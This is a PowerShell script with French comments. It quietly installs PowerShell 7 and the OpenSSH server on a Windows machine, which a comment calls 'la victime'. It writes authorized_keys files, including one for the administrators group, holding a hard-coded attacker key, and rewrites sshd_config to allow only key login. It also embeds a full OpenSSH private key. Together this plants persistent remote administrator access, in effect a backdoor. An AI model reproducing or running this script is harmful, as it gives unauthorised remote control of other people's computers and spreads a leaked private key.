$InformationPreference = 'SilentlyContinue'
$ConfirmPreference = 'None'
$ErrorActionPreference = 'Stop'
$VerbosePreference = 'Continue'
################################################################################################################################################################################
<#
.SYNOPSIS
installPwsh7 

.DESCRIPTION
install powershell 7.3.7 a partir du github.
Fait en sorte que 'pwsh' soit utilsable comme variable d'environnement
#>

function installPwsh7
{
    $pwshPath = "C:\progra~1\powershell\7\pwsh.exe"
    while(!(Test-Path -Path "$pwshPath"))
    {
        Invoke-RestMethod -Uri "https://github.com/PowerShell/PowerShell/releases/download/v7.3.7/PowerShell-7.3.7-win-x64.msi" -Method Get -OutFile "$env:TEMP\ps7.msi"
        msiexec.exe /i "$env:TEMP\ps7.msi" /quiet
        Start-Sleep 20
    }
    if (!(Get-Command pwsh))
    {
        Set-item -Path Env:\Path -Value ($env:Path + "C:\progra~1\powershell\7\;") -Force
    }
}
################################################################################################################################################################################
<#
.SYNOPSIS
installSshd 

.DESCRIPTION
install le service SSHD

.NOTES
Configure le démarrage automatique du service
Démarre le service
#>

function installSshd 
{   
    $status_install = Get-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
    $status_install = $status_install.State

    if ($status_install -match "NotPresent")
    {
        #Write-Debug "SSHD not installed"
        Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
        #Write-Debug "Install SSHD in progress..."
        Start-Service -Name sshd -Confirm:$false
        #Write-Debug "SSHD service started"
        Set-Service -Name sshd -StartupType Automatic
        #Write-Debug "set SSHD startup automatic"
    }  
    if ($status_install -match "Installed")
    {
        #Write-Debug "service SSHD already installed"
        if (!(Test-Path -Path "C:\Windows\System32\OpenSSH\sshd.exe") -or !(Test-Path -Path "C:\Windows\System32\OpenSSH\ssh.exe")) 
        {
            Write-Debug "service ssh(d) not correct"
            Write-Debug "removing ssh(d)..."
            Remove-WindowsCapability -Name "OpenSSH.Server~~~~0.0.1.0" -Online
            Remove-WindowsCapability -Name "OpenSSH.Client~~~~0.0.1.0" -Online
            Write-Debug "install ssh(d) in progress..."
            Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
            Add-WindowsCapability -Online -Name "OpenSSH.Client~~~~0.0.1.0"
            Set-Service -Name sshd -StartupType Automatic -Force
            Write-Debug "set SSHD startup automatic"
        }
        $status_lanch = Get-Service -Name sshd
        $status_lanch = $status_lanch.Status
        if ($status_lanch -notmatch "Running")
        {
            #Write-Debug "service SSHD not started"
            Start-Service -Name sshd -Confirm:$false
            #Write-Debug "SSHD service started"
        } else {Write-Debug "service SSHD is already start"}
    }
}
################################################################################################################################################################################
<#
.SYNOPSIS
createPrivateKeyOnRemote

.DESCRIPTION
créer le fichier de clé privée (id_rsa) sur la victime puis configure ses ACL

.NOTES
Avant d'ajouter ACL, l'héritage est désactivé pour suppr toutes les ACLs
Acl sur le fichier : 
Full Control pour l'utilisateur actuellement connecté +  Full Control pour SYSTEM
#>

function createPrivateKeyOnRemote 
{
    #Creation cle privee sur pc distant avec utf8
    New-Item -ItemType File -Path "$Global:contentDirectory/id_rsa" -Value $privateKey -Force
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    #Droit de la key uniquement pour l'utilisateur connecté
    $directory = "$Global:contentDirectory/id_rsa"
    $acl = Get-Acl $directory
    $acl.SetAccessRuleProtection($true,$false)
    $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("$currentUser","FullControl","Allow")
    $acl.SetAccessRule($AccessRule)
    $acl |Set-Acl
}
################################################################################################################################################################################
<#
.SYNOPSIS
createAuthorized_key

.DESCRIPTION
créer le fichier authorized_keys et administrators_authorized_keys dans $env:LOCALAPPDATA/content puis ajoute ACL
Ajoute la clé publique dans celui-ci
.NOTES
Avant d'ajouter ACL, l'héritage est désactivé pour suppr toutes les ACLs
Acl sur le fichier : 
Full Control pour l'utilisateur actuellement connecté + Full Control pour SYSTEM
#>

function createAuthorized_key #pour guest et admin
{
    $authorized_keys = "$Global:contentDirectory/authorized_keys"
    $administrators_authorized_keys = "$Global:contentDirectory/administrators_authorized_keys"
    $authorized_keys,$administrators_authorized_keys | ForEach-Object {
        New-Item -ItemType File -Path $_ -Value $pubKey -Force
        $pubKey | Out-File $_ -Encoding utf8 -Force 

        #ajout des droit neccessaire pour le fonctionnement
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl = Get-Acl $_
        $acl.SetAccessRuleProtection($true,$false)
        $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("$currentUser","FullControl","Allow")
        $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule("SYSTEM","FullControl","Allow")
        $acl.SetAccessRule($AccessRule)
        $acl.SetAccessRule($systemRule)
        $acl |Set-Acl
    }
}
################################################################################################################################################################################
<#
.SYNOPSIS
configSshd_config 

.DESCRIPTION
creer et configure le fichier de conf pour le service sshd

.NOTES
ajoute ceci :
Subsystem powershell c:/progra~1/powershell/7/pwsh.exe -sshs -NoLogo
PubkeyAuthentication yes
PasswordAuthentication no
#>

Function configSSHD_config
{ 
    $a = @"   
AuthorizedKeysFile	$Global:contentDirectory/authorized_keys
PasswordAuthentication no
Subsystem	sftp	sftp-server.exe
Subsystem powershell c:/progra~1/powershell/7/pwsh.exe -sshs -NoLogo
Match Group administrators
AuthorizedKeysFile $Global:contentDirectory/administrators_authorized_keys"
"@
    #ajout autorisation de mofifier fichier
    $pathConfigSSHD = "C:\ProgramData\ssh\sshd_config"
    New-Item -ItemType File -Path $pathConfigSSHD -Value $a -Force
}
################################################################################################################################################################################
$privateKey = '-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
'
################################################################################################################################################################################
$pubKey = @"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCo85V9PfMaI45iVykXKBWkctfC/t3aiNTy19mwVbpAy0VXwyb0IBxUo+ZkwNLD+XlONnrw8l9EYu0sJ58xrcXOVeJUdOojcbaNfuBmrYZu/yNQ7aUZjKXoZCMrjmAWS+41870VT2fEBxUBOKaHmqk5bSa6ns8Amo43S63KkeHGGmaCbWplK4eXuCGhRjYMpzd9gT9X1BqayfU3lwrV9A3hdVk+ZFMC+ffzhZuash9Ak8Uyg9oBw9RP1du2zGJFvEOzEZcpeQ77vyHVsnHsTDwNzS751vgmGVZe7pD4Wcf0HcRHPf9iNdXQyKcynhS3+cGJ2eWACrMeG6dSeSSZ8ku8kbzKtV04cGCtQaQSwnhZONDbZZ2RRBYISF+7wKBBzlQBCedVLT8GmF0/6BpgL5czm++XSX6hNcgeyp6N/7MmuyTqA+a+Sgmh+dL1AH9fK6F0oGTV8pIDrCdKLC91G47Hpfd0wIVTmBhc+XuXn85xkqoRdhyOz2Cde1EHLpFh+Is= gunsa@DESKTOP-TV94KT0
"@
################################################################################################################################################################################